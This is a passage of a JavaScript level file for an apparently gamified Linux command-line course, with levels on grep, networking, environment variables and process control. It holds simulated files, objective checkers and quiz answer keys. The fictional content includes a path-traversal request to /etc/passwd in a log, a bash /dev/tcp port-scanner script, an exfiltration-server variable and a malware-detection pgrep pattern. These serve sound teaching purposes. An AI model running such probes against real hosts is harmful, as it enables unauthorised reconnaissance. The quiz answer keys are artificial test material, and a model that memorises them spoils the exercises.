192.168.1.105 - - [15/Jan/2024:10:19:33] "GET /admin/config.php" 403 234
10.0.0.88 - - [15/Jan/2024:10:20:15] "GET /../../../etc/passwd" 400 0`
                },
                '/home/operator/logs/error.log': {
                    type: 'file',
                    perms: '-rw-r--r--',
                    owner: 'operator',
                    group: 'operator',
                    size: 567,
                    content: `[ERROR] 10:15:45 - SQL injection attempt detected from 10.0.0.88
[WARNING] 10:16:22 - Multiple failed auth attempts from 10.0.0.88
[ERROR] 10:17:45 - Brute force pattern detected from 10.0.0.88
[INFO] 10:18:12 - Rate limiting enabled for 10.0.0.88
[ERROR] 10:19:33 - Path traversal attempt blocked from 10.0.0.88
[CRITICAL] 10:20:15 - Attack signature matched: directory traversal`
                },
                '/home/operator/reports': {
                    type: 'dir',
                    perms: 'drwxr-xr-x',
                    owner: 'operator',
                    group: 'operator',
                    children: ['README.txt']
                },
                '/home/operator/reports/README.txt': {
                    type: 'file',
                    perms: '-rw-r--r--',
                    owner: 'operator',
                    group: 'operator',
                    size: 89,
                    content: `Grep Output Directory
Save your search results here using redirection:
grep -i "error" logs/system.log > reports/errors.txt`
                },
                '/home/operator/data': {
                    type: 'dir',
                    perms: 'drwxr-xr-x',
                    owner: 'operator',
                    group: 'operator',
                    children: ['suspicious_ips.txt', 'known_attackers.txt']
                },
                '/home/operator/data/suspicious_ips.txt': {
                    type: 'file',
                    perms: '-rw-r--r--',
                    owner: 'operator',
                    group: 'operator',
                    size: 156,
                    content: `10.0.0.88 - Flagged for investigation
10.0.0.99 - Known scanner
172.16.100.5 - Suspicious activity
192.168.50.123 - Under review`
                },
                '/home/operator/data/known_attackers.txt': {
                    type: 'file',
                    perms: '-rw-r--r--',
                    owner: 'operator',
                    group: 'operator',
                    size: 234,
                    content: `# Known malicious IPs - DO NOT WHITELIST
10.0.0.88 - Active attacker (brute force, SQL injection, path traversal)
185.220.101.1 - Tor exit node
45.33.32.156 - Botnet C2
198.51.100.23 - DDoS source`
                },
                '/home/operator/.bash_history': {
                    type: 'file',
                    perms: '-rw-------',
                    owner: 'operator',
                    group: 'operator',
                    size: 245,
                    content: `ls -la logs/
cat logs/auth.log | head
grep "FAILED" logs/auth.log
grep -i error logs/system.log
grep -v success logs/auth.log
grep -c FAILED logs/auth.log
grep -n 192.168 logs/network.log`
                },
                '/home/operator/.grep_cheatsheet': {
                    type: 'file',
                    perms: '-rw-r--r--',
                    owner: 'operator',
                    group: 'operator',
                    size: 456,
                    content: `GREP QUICK REFERENCE
====================
-i  Case insensitive
-v  Invert match (exclude)
-c  Count matches only
-n  Show line numbers
-r  Recursive search
-E  Extended regex (egrep)
-o  Only show matched part
-l  List files with matches
-A3 Show 3 lines after match
-B3 Show 3 lines before match
-C3 Show 3 lines context

REGEX BASICS:
.     Any single character
*     Zero or more of previous
+     One or more (use -E)
^     Start of line
$     End of line
[abc] Character class
[0-9] Digit range`
                },
            },

            objectives: [
                {
                    id: 1,
                    task: 'HUNT: Case-Insensitive Search',
                    hint: 'Find "error" (any case): grep -i "error" logs/system.log',
                    check: (cmd, state, output) => cmd.includes('grep') && cmd.includes('-i') &&
                               cmd.toLowerCase().includes('error') &&
                               output && !output.startsWith('grep:') && output.length > 0
                },
                {
                    id: 2,
                    task: 'EXCLUDE: Invert the Match',
                    hint: 'Show non-success lines: grep -v "success" logs/auth.log',
                    check: (cmd, state, output) => cmd.includes('grep') && cmd.includes('-v') &&
                               output && !output.startsWith('grep:') && output.includes('FAILED')
                },
                {
                    id: 3,
                    task: 'COUNT: Quantify the Threat',
                    hint: 'Count FAILED logins: grep -c "FAILED" logs/auth.log',
                    check: (cmd, state, output) => cmd.includes('grep') && cmd.includes('-c') &&
                               output && /^\d+$/.test(output.trim()) && parseInt(output.trim()) > 0
                },
                {
                    id: 4,
                    task: 'LOCATE: Show Line Numbers',
                    hint: 'Show with line numbers: grep -n "192.168" logs/network.log',
                    check: (cmd, state, output) => cmd.includes('grep') && cmd.includes('-n') &&
                               output && /^\d+:/.test(output.trim())
                },
                {
                    id: 5,
                    task: 'REGEX: Match IP Pattern',
                    hint: 'Use regex: grep -E "[0-9]+\\.[0-9]+\\.[0-9]+\\.[0-9]+" logs/network.log',
                    check: (cmd, state, output) => ((cmd.includes('grep') && cmd.includes('-E')) ||
                               cmd.includes('egrep')) && output && !output.startsWith('grep:') &&
                               /\d+\.\d+\.\d+\.\d+/.test(output)
                },
            ],

            // Insight Phase
            insightPhase: {
                enabled: true,
                question: "How many failed login attempts were recorded in auth.log?",
                acceptedAnswers: [
                    "6",
                    "six",
                    "6 failed",
                    "6 attempts"
                ],
                hint: "Use grep -c to count lines matching 'FAILED' in the auth log.",
                hintAfterAttempts: 3,
                wrongAnswerMessage: "Count not confirmed. Use grep -c 'FAILED' logs/auth.log",
                correctAnswerMessage: "Brute force confirmed: 6 failed attempts from hostile IP. Countermeasures deployed."
            },

            remoteHosts: null,
        },

        // ──────────────────────────────────────────────────────────
        // CLH-012: Network Basics
        // Theme: Network reconnaissance commands
        // ──────────────────────────────────────────────────────────
        'CLH-012': {
            title: 'Network Basics',
            description: 'Master ping, netstat, ss, and ip commands for network reconnaissance.',
            prerequisites: ['CLH-011'],
            tier: 'CLI Shadow',
            user: 'operator',
            hostname: 'shadow',
            startDir: '/home/operator',
            allowedCommands: null,

            filesystem: {
                '/home/operator': {
                    type: 'dir',
                    perms: 'drwxr-xr-x',
                    owner: 'operator',
                    group: 'operator',
                    children: ['intel', 'logs', 'reports', 'scripts', '.bash_history', '.network_cheatsheet']
                },
                '/home/operator/intel': {
                    type: 'dir',
                    perms: 'drwxr-xr-x',
                    owner: 'operator',
                    group: 'operator',
                    children: ['targets.txt', 'scan_results.txt', 'network_map.txt', 'services.txt']
                },
                '/home/operator/intel/targets.txt': {
                    type: 'file',
                    perms: '-rw-r--r--',
                    owner: 'operator',
                    group: 'operator',
                    size: 245,
                    content: `# Target Network - Shadow Operations
10.0.0.5 - Primary server (CRITICAL)
10.0.0.10 - Database server
10.0.0.15 - Web server
10.0.0.20 - File server
192.168.1.1 - Gateway/Router
192.168.1.105 - Analyst workstation
172.16.0.1 - DMZ gateway`
                },
                '/home/operator/intel/scan_results.txt': {
                    type: 'file',
                    perms: '-rw-r--r--',
                    owner: 'operator',
                    group: 'operator',
                    size: 234,
                    content: `Port scan results for 10.0.0.5:
22/tcp open ssh OpenSSH 8.2
80/tcp open http Apache 2.4.41
443/tcp open https Apache 2.4.41
3306/tcp open mysql MySQL 8.0.23
8080/tcp filtered http-proxy`
                },
                '/home/operator/intel/network_map.txt': {
                    type: 'file',
                    perms: '-rw-r--r--',
                    owner: 'operator',
                    group: 'operator',
                    size: 345,
                    content: `NETWORK TOPOLOGY
================
                    [Internet]
                        |
                  [192.168.1.1]  <-- Gateway
                        |
        +---------------+---------------+
        |               |               |
   [10.0.0.5]      [10.0.0.10]    [10.0.0.15]
   Primary         Database        Web
   Server          Server          Server`
                },
                '/home/operator/intel/services.txt': {
                    type: 'file',
                    perms: '-rw-r--r--',
                    owner: 'operator',
                    group: 'operator',
                    size: 189,
                    content: `Running Services Detected:
- SSH (22): Remote administration
- HTTP (80): Web application
- HTTPS (443): Secure web
- MySQL (3306): Database backend
- Monitoring agent on 10.0.0.5:9100`
                },
                '/home/operator/logs': {
                    type: 'dir',
                    perms: 'drwxr-xr-x',
                    owner: 'operator',
                    group: 'operator',
                    children: ['connections.log', 'ping.log']
                },
                '/home/operator/logs/connections.log': {
                    type: 'file',
                    perms: '-rw-r--r--',
                    owner: 'operator',
                    group: 'operator',
                    size: 312,
                    content: `2024-01-15 10:15:32 ESTABLISHED 192.168.1.105:44821 -> 10.0.0.5:443
2024-01-15 10:15:45 ESTABLISHED 192.168.1.42:55123 -> 10.0.0.5:80
2024-01-15 10:16:01 TIME_WAIT 10.0.0.88:53421 -> 10.0.0.5:3306
2024-01-15 10:16:22 ESTABLISHED 172.16.0.23:61234 -> 10.0.0.5:22
2024-01-15 10:17:03 SYN_SENT 10.0.0.88:55555 -> 10.0.0.5:445`
                },
                '/home/operator/logs/ping.log': {
                    type: 'file',
                    perms: '-rw-r--r--',
                    owner: 'operator',
                    group: 'operator',
                    size: 234,
                    content: `Connectivity check - 2024-01-15
10.0.0.5: 64 bytes, time=0.5ms - UP
10.0.0.10: 64 bytes, time=0.8ms - UP
10.0.0.15: 64 bytes, time=1.2ms - UP
192.168.1.1: 64 bytes, time=0.3ms - UP
172.16.0.1: Request timeout - DOWN`
                },
                '/home/operator/reports': {
                    type: 'dir',
                    perms: 'drwxr-xr-x',
                    owner: 'operator',
                    group: 'operator',
                    children: ['README.txt']
                },
                '/home/operator/reports/README.txt': {
                    type: 'file',
                    perms: '-rw-r--r--',
                    owner: 'operator',
                    group: 'operator',
                    size: 78,
                    content: `Network Recon Reports
Save your findings here:
netstat -tuln > reports/ports.txt`
                },
                '/home/operator/scripts': {
                    type: 'dir',
                    perms: 'drwxr-xr-x',
                    owner: 'operator',
                    group: 'operator',
                    children: ['netcheck.sh', 'portscan.sh']
                },
                '/home/operator/scripts/netcheck.sh': {
                    type: 'file',
                    perms: '-rwxr-xr-x',
                    owner: 'operator',
                    group: 'operator',
                    size: 256,
                    content: `#!/bin/bash
# Network connectivity checker
echo "=== NETWORK STATUS ==="
ip addr | grep inet
echo "=== GATEWAY ==="
ip route | grep default
echo "=== DNS ==="
cat /etc/resolv.conf 2>/dev/null`
                },
                '/home/operator/scripts/portscan.sh': {
                    type: 'file',
                    perms: '-rwxr-xr-x',
                    owner: 'operator',
                    group: 'operator',
                    size: 189,
                    content: `#!/bin/bash
# Quick port scanner
TARGET=\${1:-10.0.0.5}
echo "Scanning $TARGET..."
for port in 22 80 443 3306 8080; do
  timeout 1 bash -c "echo >/dev/tcp/$TARGET/$port" 2>/dev/null && echo "$port open"
done`
                },
                '/home/operator/.bash_history': {
                    type: 'file',
                    perms: '-rw-------',
                    owner: 'operator',
                    group: 'operator',
                    size: 178,
                    content: `cat intel/targets.txt
ping 10.0.0.5
netstat -tuln
ss -tp
ip addr
ip route
cat intel/scan_results.txt`
                },
                '/home/operator/.network_cheatsheet': {
                    type: 'file',
                    perms: '-rw-r--r--',
                    owner: 'operator',
                    group: 'operator',
                    size: 456,
                    content: `NETWORK RECON CHEATSHEET
========================
CONNECTIVITY:
  ping <ip>           Test if host is up
  ping -c 4 <ip>      Send only 4 packets

LISTENING PORTS:
  netstat -tuln       TCP/UDP listening ports
  ss -tuln            Modern alternative to netstat

CONNECTIONS:
  netstat -tp         TCP connections with PIDs
  ss -tp              Socket stats with processes

IP CONFIGURATION:
  ip addr             Show all IP addresses
  ip a                Short form
  ifconfig            Legacy command

ROUTING:
  ip route            Show routing table
  route -n            Legacy routing table`
                },
            },

            objectives: [
                {
                    id: 1,
                    task: 'RECON: Check Host Connectivity',
                    hint: 'Test connectivity: ping 10.0.0.5',
                    check: (cmd, state, output) => cmd.includes('ping') &&
                               output && (output.includes('bytes from') || output.includes('PING'))
                },
                {
                    id: 2,
                    task: 'SCAN: List Listening Ports',
                    hint: 'Show listening ports: netstat -tuln',
                    check: (cmd, state, output) => (cmd.includes('netstat') || cmd.includes('ss')) &&
                               output && (output.includes('LISTEN') || output.includes('Local Address'))
                },
                {
                    id: 3,
                    task: 'ANALYZE: Socket Statistics',
                    hint: 'Show connections: ss -tp',
                    check: (cmd, state, output) => cmd.includes('ss') &&
                               output && (output.includes('ESTAB') || output.includes('State'))
                },
                {
                    id: 4,
                    task: 'IDENTIFY: Show IP Configuration',
                    hint: 'Display IPs: ip addr',
                    check: (cmd, state, output) => (cmd.includes('ip') && (cmd.includes('addr') || cmd.includes(' a '))) &&
                               output && (output.includes('inet') || output.includes('192.168'))
                },
                {
                    id: 5,
                    task: 'MAP: View Routing Table',
                    hint: 'Show routes: ip route',
                    check: (cmd, state, output) => cmd.includes('ip') && cmd.includes('route') &&
                               output && (output.includes('default') || output.includes('via'))
                },
            ],

            // Insight Phase
            insightPhase: {
                enabled: true,
                question: "Based on the scan results, what database port is open on the target?",
                acceptedAnswers: ["3306", "mysql", "3306/tcp"],
                hint: "Check the scan_results.txt file in the intel directory.",
                hintAfterAttempts: 3,
                wrongAnswerMessage: "Port not confirmed. Review the scan results in intel/.",
                correctAnswerMessage: "Confirmed: MySQL on port 3306. Database access possible."
            },

            remoteHosts: null,
        },

        // ──────────────────────────────────────────────────────────
        // CLH-013: Environment Variables
        // Theme: Shell environment manipulation
        // ──────────────────────────────────────────────────────────
        'CLH-013': {
            title: 'Environment Variables',
            description: 'Understand and manipulate shell environment variables.',
            prerequisites: ['CLH-012'],
            tier: 'CLI Shadow',
            user: 'operator',
            hostname: 'shadow',
            startDir: '/home/operator',
            allowedCommands: null,

            filesystem: {
                '/home/operator': {
                    type: 'dir',
                    perms: 'drwxr-xr-x',
                    owner: 'operator',
                    group: 'operator',
                    children: ['.bashrc', '.profile', '.bash_history', '.env_cheatsheet', 'scripts', 'config', 'logs', 'intel', 'reports']
                },
                '/home/operator/.bashrc': {
                    type: 'file',
                    perms: '-rw-r--r--',
                    owner: 'operator',
                    group: 'operator',
                    size: 234,
                    content: `# Operator shell config
export PS1="\\u@\\h:\\w$ "
alias ll="ls -la"
alias grep="grep --color=auto"
export EDITOR=vim
export HISTSIZE=10000
# Custom tools path
export TOOLS=/opt/shadow-tools`
                },
                '/home/operator/.profile': {
                    type: 'file',
                    perms: '-rw-r--r--',
                    owner: 'operator',
                    group: 'operator',
                    size: 178,
                    content: `# Profile settings - loaded at login
export PATH=$PATH:$HOME/bin
export LANG=en_US.UTF-8

# Mission-specific settings
export LOG_LEVEL=debug
export OPERATION_MODE=stealth`
                },
                '/home/operator/.bash_history': {
                    type: 'file',
                    perms: '-rw-------',
                    owner: 'operator',
                    group: 'operator',
                    size: 145,
                    content: `env
echo $PATH
echo $HOME
export MISSION=active
export PATH=$PATH:/opt/shadow-tools
cat .bashrc
printenv | grep PATH`
                },
                '/home/operator/.env_cheatsheet': {
                    type: 'file',
                    perms: '-rw-r--r--',
                    owner: 'operator',
                    group: 'operator',
                    size: 456,
                    content: `ENVIRONMENT VARIABLES CHEATSHEET
=================================
VIEWING:
  env                  Show all variables
  printenv             Same as env
  echo $VAR            Show specific variable
  printenv VAR         Show specific (no $)

SETTING:
  VAR=value            Set for current command only
  export VAR=value     Set for current session
  unset VAR            Remove variable

IMPORTANT VARIABLES:
  PATH     Search path for commands
  HOME     User's home directory
  USER     Current username
  SHELL    Current shell
  PWD      Current directory
  EDITOR   Default text editor
  LANG     Language/locale

PERSISTENCE:
  ~/.bashrc   Loaded on each new shell
  ~/.profile  Loaded at login only`
                },
                '/home/operator/scripts': {
                    type: 'dir',
                    perms: 'drwxr-xr-x',
                    owner: 'operator',
                    group: 'operator',
                    children: ['setup_env.sh']
                },
                '/home/operator/scripts/setup_env.sh': {
                    type: 'file',
                    perms: '-rwxr-xr-x',
                    owner: 'operator',
                    group: 'operator',
                    size: 234,
                    content: `#!/bin/bash
# Setup mission environment
export MISSION=active
export TARGET_IP=10.0.0.5
export LOG_DIR=/var/log/ops
export PATH=$PATH:/opt/shadow-tools

echo "Environment configured for operation"
env | grep -E "(MISSION|TARGET|LOG_DIR)"`
                },
                '/home/operator/config': {
                    type: 'dir',
                    perms: 'drwxr-xr-x',
                    owner: 'operator',
                    group: 'operator',
                    children: ['mission.env']
                },
                '/home/operator/config/mission.env': {
                    type: 'file',
                    perms: '-rw-r--r--',
                    owner: 'operator',
                    group: 'operator',
                    size: 189,
                    content: `# Mission configuration - source this file
# Usage: source config/mission.env

export OPERATION_NAME="Shadow Strike"
export TARGET_NETWORK="10.0.0.0/24"
export EXFIL_SERVER="192.168.100.1"
export ENCRYPTION_KEY="[CLASSIFIED]"`
                },
                // === LOGS DIRECTORY ===
                '/home/operator/logs': {
                    type: 'dir',
                    perms: 'drwxr-xr-x',
                    owner: 'operator',
                    group: 'operator',
                    children: ['env.log', 'session.log']
                },
                '/home/operator/logs/env.log': {
                    type: 'file',
                    perms: '-rw-r--r--',
                    owner: 'operator',
                    group: 'operator',
                    size: 312,
                    content: `[2024-01-15 08:00] Environment initialized
[2024-01-15 08:01] PATH extended: /opt/shadow-tools
[2024-01-15 08:02] MISSION variable set: active
[2024-01-15 08:05] Source: config/mission.env loaded
[2024-01-15 08:10] OPERATION_NAME: Shadow Strike
[2024-01-15 08:15] Session ready for operation`
                },
                '/home/operator/logs/session.log': {
                    type: 'file',
                    perms: '-rw-r--r--',
                    owner: 'operator',
                    group: 'operator',
                    size: 245,
                    content: `Session: operator@shadow
Started: 2024-01-15 07:55:00
Shell: /bin/bash
Term: xterm-256color
Environment loaded from: ~/.bashrc, ~/.profile
Custom tools: /opt/shadow-tools`
                },
                // === INTEL DIRECTORY ===
                '/home/operator/intel': {
                    type: 'dir',
                    perms: 'drwxr-xr-x',
                    owner: 'operator',
                    group: 'operator',
                    children: ['briefing.txt', 'variables.md']
                },
                '/home/operator/intel/briefing.txt': {
                    type: 'file',
                    perms: '-rw-r--r--',
                    owner: 'operator',
                    group: 'operator',
                    size: 356,
                    content: `=== MISSION BRIEFING ===
OPERATION: Shadow Strike
STATUS: Active

Environment variables control mission parameters.
Configure the following before operation:
- MISSION: Set to 'active' when ready
- PATH: Must include /opt/shadow-tools
- TARGET_IP: Primary objective

Review .bashrc for persistent configuration.
Run 'env' to verify all variables are set.`
                },
                '/home/operator/intel/variables.md': {
                    type: 'file',
                    perms: '-rw-r--r--',
                    owner: 'operator',
                    group: 'operator',
                    size: 420,
                    content: `# Critical Variables Reference

| Variable | Purpose | Value |
|----------|---------|-------|
| MISSION | Operation status | active |
| TARGET_IP | Primary target | 10.0.0.5 |
| EXFIL_SERVER | Data extraction | 192.168.100.1 |
| LOG_DIR | Operation logs | /var/log/ops |

## Notes
- Always verify PATH includes shadow-tools
- Source mission.env before operation
- Check env output matches expected config`
                },
                // === REPORTS DIRECTORY ===
                '/home/operator/reports': {
                    type: 'dir',
                    perms: 'drwxr-xr-x',
                    owner: 'operator',
                    group: 'operator',
                    children: ['README.txt']
                },
                '/home/operator/reports/README.txt': {
                    type: 'file',
                    perms: '-rw-r--r--',
                    owner: 'operator',
                    group: 'operator',
                    size: 189,
                    content: `# Reports Directory

Save environment audits here:
  env > reports/env_dump.txt
  printenv | sort > reports/sorted_vars.txt
  echo $PATH > reports/path.txt

Use for mission verification before operations.`
                },
            },

            objectives: [
                {
                    id: 1,
                    task: 'SURVEY: List All Variables',
                    hint: 'Display all: env',
                    check: (cmd, state, output) => (cmd.includes('env') || cmd.includes('printenv')) &&
                               output && (output.includes('PATH') || output.includes('HOME'))
                },
                {
                    id: 2,
                    task: 'INSPECT: Check Your PATH',
                    hint: 'Show PATH: echo $PATH',
                    check: (cmd, state, output) => cmd.includes('echo') && cmd.includes('PATH') &&
                               output && (output.includes('/usr') || output.includes('/bin'))
                },
                {
                    id: 3,
                    task: 'IDENTIFY: Find Your Home',
                    hint: 'Show HOME: echo $HOME',
                    check: (cmd, state, output) => cmd.includes('echo') && cmd.includes('HOME') &&
                               output && output.includes('/home')
                },
                {
                    id: 4,
                    task: 'CREATE: Set Mission Variable',
                    hint: 'Create variable: export MISSION=active',
                    check: (cmd, state, output) => cmd.includes('export') && cmd.includes('MISSION')
                },
                {
                    id: 5,
                    task: 'EXTEND: Add Tools to PATH',
                    hint: 'Extend PATH: export PATH=$PATH:/opt/shadow-tools',
                    check: (cmd, state, output) => cmd.includes('export') && cmd.includes('PATH') && cmd.includes('/opt')
                },
            ],

            // Insight Phase
            insightPhase: {
                enabled: true,
                question: "What alias is defined in the operator's .bashrc file?",
                acceptedAnswers: ["ll", "ls -la", "ll="],
                hint: "Read the .bashrc file to see what shortcuts are configured.",
                hintAfterAttempts: 3,
                wrongAnswerMessage: "Alias not found. Check cat .bashrc for defined aliases.",
                correctAnswerMessage: "Confirmed: 'll' alias maps to 'ls -la'. Shell configured."
            },

            remoteHosts: null,
        },

        // ──────────────────────────────────────────────────────────
        // CLH-014: Process Control
        // Theme: Process management and termination
        // ──────────────────────────────────────────────────────────
        'CLH-014': {
            title: 'Process Control',
            description: 'Manage and terminate processes. Master kill, jobs, bg, fg, and nohup.',
            prerequisites: ['CLH-013'],
            tier: 'CLI Phantom',
            user: 'operator',
            hostname: 'shadow',
            startDir: '/home/operator',
            allowedCommands: null,

            filesystem: {
                '/home/operator': {
                    type: 'dir',
                    perms: 'drwxr-xr-x',
                    owner: 'operator',
                    group: 'operator',
                    children: ['monitor.sh', 'intel', 'scripts', 'logs', '.bash_history', '.process_cheatsheet']
                },
                '/home/operator/monitor.sh': {
                    type: 'file',
                    perms: '-rwxr-xr-x',
                    owner: 'operator',
                    group: 'operator',
                    size: 98,
                    content: `#!/bin/bash
# Continuous monitoring script
# Run with: nohup ./monitor.sh &
while true; do
  date >> /tmp/monitor.log
  ps aux >> /tmp/process_snapshot.log
  sleep 60
done`
                },
                '/home/operator/intel': {
                    type: 'dir',
                    perms: 'drwxr-xr-x',
                    owner: 'operator',
                    group: 'operator',
                    children: ['processes.txt', 'incident_report.txt', 'kill_targets.txt']
                },
                '/home/operator/intel/processes.txt': {
                    type: 'file',
                    perms: '-rw-r--r--',
                    owner: 'operator',
                    group: 'operator',
                    size: 256,
                    content: `Known malicious processes:

CRYPTOMINERS:
- rogue_agent (cryptominer) - PID typically 6666
  Uses high CPU, connects to mining pools

BACKDOORS:
- backdoor_shell (reverse shell)
- keylogger_x (keylogger)

Action: Terminate with kill -9 if SIGTERM fails.`
                },
                '/home/operator/intel/incident_report.txt': {
                    type: 'file',
                    perms: '-rw-r--r--',
                    owner: 'operator',
                    group: 'operator',
                    size: 312,
                    content: `INCIDENT REPORT - IR-2026-0147
=============================
Date: 2026-01-19
Severity: HIGH

Anomaly detected on production server.
CPU usage spiked to 98% at 09:15.

Initial analysis suggests cryptominer activity.
Process running as 'nobody' user - possible privilege escalation.

REQUIRED ACTIONS:
1. Identify rogue process (ps aux | grep)
2. Terminate the process (kill PID)
3. Establish persistent monitoring (nohup)`
                },
                '/home/operator/intel/kill_targets.txt': {
                    type: 'file',
                    perms: '-rw-r--r--',
                    owner: 'operator',
                    group: 'operator',
                    size: 128,
                    content: `APPROVED FOR TERMINATION
========================
PID: 6666 - rogue_agent (cryptominer)

DO NOT KILL:
- PID 1 (init)
- PID 345 (sshd)
- PID 456 (cron)
- PID 789 (nginx)`
                },
                '/home/operator/scripts': {
                    type: 'dir',
                    perms: 'drwxr-xr-x',
                    owner: 'operator',
                    group: 'operator',
                    children: ['cleanup.sh', 'watchdog.sh']
                },
                '/home/operator/scripts/cleanup.sh': {
                    type: 'file',
                    perms: '-rwxr-xr-x',
                    owner: 'operator',
                    group: 'operator',
                    size: 145,
                    content: `#!/bin/bash
# Cleanup script - terminates known bad processes
killall rogue_agent 2>/dev/null
killall backdoor_shell 2>/dev/null
echo "Cleanup complete"`
                },
                '/home/operator/scripts/watchdog.sh': {
                    type: 'file',
                    perms: '-rwxr-xr-x',
                    owner: 'operator',
                    group: 'operator',
                    size: 178,
                    content: `#!/bin/bash
# Watchdog - monitor for suspicious processes
# Run with: nohup ./scripts/watchdog.sh &
while true; do
  pgrep -f "rogue|backdoor|miner" && echo "ALERT: Threat detected!"
  sleep 30
done`
                },
                '/home/operator/logs': {
                    type: 'dir',
                    perms: 'drwxr-xr-x',
                    owner: 'operator',
                    group: 'operator',
                    children: ['process_history.log', 'alerts.log']
                },
                '/home/operator/logs/process_history.log': {
                    type: 'file',
                    perms: '-rw-r--r--',
                    owner: 'operator',
                    group: 'operator',
                    size: 478,
                    content: `[2026-01-19 08:00:01] System boot complete
[2026-01-19 08:00:12] sshd started (PID 345)
[2026-01-19 08:00:15] cron started (PID 456)
[2026-01-19 08:00:18] nginx started (PID 789)
[2026-01-19 09:15:33] ALERT: Unknown process spawned
[2026-01-19 09:15:33] Process: rogue_agent (PID 6666)
[2026-01-19 09:15:34] User: nobody (unexpected!)
[2026-01-19 09:15:35] CPU: 98.5% (CRITICAL)
[2026-01-19 09:15:36] Network: Outbound connection to evil.pool:3333`
                },
                '/home/operator/logs/alerts.log': {
                    type: 'file',
                    perms: '-rw-r--r--',
                    owner: 'operator',
                    group: 'operator',
                    size: 256,
                    content: `SECURITY ALERT LOG
==================
[09:15:35] HIGH: Cryptominer detected - rogue_agent PID 6666
[09:15:36] HIGH: Unauthorized mining pool connection
[09:16:01] MEDIUM: Process consuming excessive CPU
[09:20:00] INFO: Awaiting operator intervention`
                },
                '/home/operator/.bash_history': {
                    type: 'file',
                    perms: '-rw-------',
                    owner: 'operator',
                    group: 'operator',
                    size: 89,
                    content: `ps aux
ps aux | grep rogue
kill 6666
jobs
nohup ./monitor.sh &`
                },
                '/home/operator/.process_cheatsheet': {
                    type: 'file',
                    perms: '-rw-r--r--',
                    owner: 'operator',
                    group: 'operator',
                    size: 856,
                    content: `╔═══════════════════════════════════════════════════════════════╗
║           PROCESS CONTROL CHEATSHEET                          ║
╚═══════════════════════════════════════════════════════════════╝

VIEWING PROCESSES
─────────────────
ps aux              All processes, BSD style
ps -ef              All processes, System V style
top                 Real-time process monitor
pgrep <name>        Find PID by name

TERMINATING PROCESSES
────────────────────
kill <PID>          Send SIGTERM (graceful shutdown)
kill -9 <PID>       Send SIGKILL (force kill)
killall <name>      Kill all processes by name
pkill <pattern>     Kill by pattern match

SIGNALS
───────
SIGTERM (15)        Request termination (default)
SIGKILL (9)         Force kill (cannot be caught)
SIGSTOP (19)        Pause process
SIGCONT (18)        Resume process
SIGHUP (1)          Hangup - used to reload config

JOB CONTROL
───────────
command &           Run in background
jobs                List background jobs
fg %<n>             Bring job to foreground
bg %<n>             Continue job in background
Ctrl+Z              Suspend current job

PERSISTENT PROCESSES
───────────────────
nohup cmd &         Run immune to hangups
disown              Remove job from shell
screen              Terminal multiplexer
tmux                Modern terminal multiplexer`
                },
            },

            objectives: [
                {
                    id: 1,
                    task: 'SURVEY: List Running Processes',
                    hint: 'Show all processes: ps aux',
                    check: (cmd, state, output) => cmd.includes('ps') &&
                        (cmd.includes('aux') || cmd.includes('-ef') || cmd.includes('-e')) &&
                        output && (output.includes('PID') || output.includes('COMMAND'))
                },
                {
                    id: 2,
                    task: 'HUNT: Find Suspicious Process',
                    hint: 'Filter processes: ps aux | grep rogue',
                    check: (cmd, state, output) => cmd.includes('ps') && cmd.includes('grep') &&
                        output && (output.includes('rogue') || output.includes('6666'))
                },
                {
                    id: 3,
                    task: 'TERMINATE: Kill by PID',
                    hint: 'Kill process: kill 6666',
                    check: (cmd, state, output) => cmd.includes('kill') && cmd.includes('6666') &&
                        output && output.includes('Terminated')
                },
                {
                    id: 4,
                    task: 'MANAGE: View Background Jobs',
                    hint: 'List jobs: jobs',
                    check: (cmd, state) => cmd.trim() === 'jobs'
                },
                {
                    id: 5,
                    task: 'PERSIST: Run Immune to Hangup',
                    hint: 'Run persistent: nohup ./monitor.sh &',
                    check: (cmd, state, output) => cmd.includes('nohup') &&
                        output && output.includes('nohup.out')
                },
            ],

            // Insight Phase
            insightPhase: {
                enabled: true,
                question: "According to intel, what is the name of the cryptominer process?",
                acceptedAnswers: ["rogue_agent", "rogue agent", "rogueagent"],
                hint: "Check the processes.txt file in the intel directory for known threats.",
                hintAfterAttempts: 3,
                wrongAnswerMessage: "Process not recognized. Review intel/processes.txt for malicious process names.",
                correctAnswerMessage: "Threat identified: rogue_agent (cryptominer). Terminate with extreme prejudice."
            },

            remoteHosts: null,
        },

        // ──────────────────────────────────────────────────────────
        // CLH-015: OPERATION MOLE HUNT (Midterm)
        // Theme: Identify the traitor through data correlation
        // ──────────────────────────────────────────────────────────
        'CLH-015': {
            title: 'OPERATION MOLE HUNT',
            description: 'Midterm Mission: Intelligence indicates a traitor among our operators. Cross-reference personnel files to identify the mole.',
            prerequisites: ['CLH-014'],
            tier: 'CLI Phantom',
            user: 'analyst',
            hostname: 'COUNTER-INTEL',
            startDir: '/home/analyst',
            allowedCommands: null,

            filesystem: {
                // Override root to include /evidence and /tmp in children
                '/': {
                    type: 'dir',
                    perms: 'drwxr-xr-x',
                    owner: 'root',
                    group: 'root',
                    children: ['home', 'etc', 'var', 'tmp', 'usr', 'bin', 'sbin', 'opt', 'root', 'evidence']
                },
                '/home/analyst': {
                    type: 'dir',
                    perms: 'drwxr-xr-x',
                    owner: 'analyst',
                    group: 'analyst',
                    children: ['mission_brief.txt', 'workspace', 'evidence', '.bash_history', '.molehunt_cheatsheet']
                },
                '/home/analyst/evidence': {
                    type: 'symlink',
                    perms: 'lrwxrwxrwx',
                    owner: 'analyst',
                    group: 'analyst',
                    target: '/evidence'
                },
                '/home/analyst/mission_brief.txt': {
                    type: 'file',
                    perms: '-rw-r--r--',
                    owner: 'analyst',
                    group: 'analyst',
                    size: 1024,
                    content: `╔═══════════════════════════════════════════════════════════════╗
║         OPERATION MOLE HUNT - CLASSIFIED BRIEFING             ║
╚═══════════════════════════════════════════════════════════════╝

SITUATION:
Intelligence confirms a TRAITOR among our field operators.
Multiple operations have been compromised. We have a mole.

YOUR MISSION:
Cross-reference personnel databases to identify the traitor.
Evidence has been collected in /evidence directory.

INTELLIGENCE CONSTRAINTS (read /evidence/intel/constraints.txt):
The traitor matches ALL of the following criteria:
  1. Was assigned to an operation that is now INACTIVE
  2. Has ZONE-ALPHA security clearance
  3. Their compromised operation was in SECTOR-7
  4. Is NOT currently assigned to any ACTIVE operation

PROCESS:
  1. Study the constraints carefully
  2. Cross-reference the personnel and operations files
  3. Use grep and pipes to filter data
  4. Narrow down to exactly 3 SUSPECTS
  5. Find the SMOKING GUN to identify the actual traitor

REPORT FORMAT: SUSPECT1,SUSPECT2,SUSPECT3:TRAITOR
(Suspects in alphabetical order)

